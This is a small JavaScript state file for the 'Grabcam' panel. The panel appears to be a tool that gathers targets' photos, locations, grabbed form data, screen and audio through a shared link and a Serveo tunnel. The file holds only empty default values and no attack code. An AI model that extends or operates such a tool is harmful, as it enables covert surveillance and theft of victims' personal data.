/**
 * Общее состояние панели Grabcam (доступно всем feature-модулям).
 */
export const state = {
  sessionStartTime: 0,
  lastTargets: 0,
  lastUniqueIPs: 0,
  lastLinkUrl: "",
  lastPhotosKey: "",
  lastLocationsKey: "",
  lastFormgrabKey: "",
  lastScreenKey: "",
  lastAudioKey: "",
  lastSummaryText: "",
  mapInstance: null,
  copyFeedbackTimer: null,
  serveoWaitStart: 0,
};
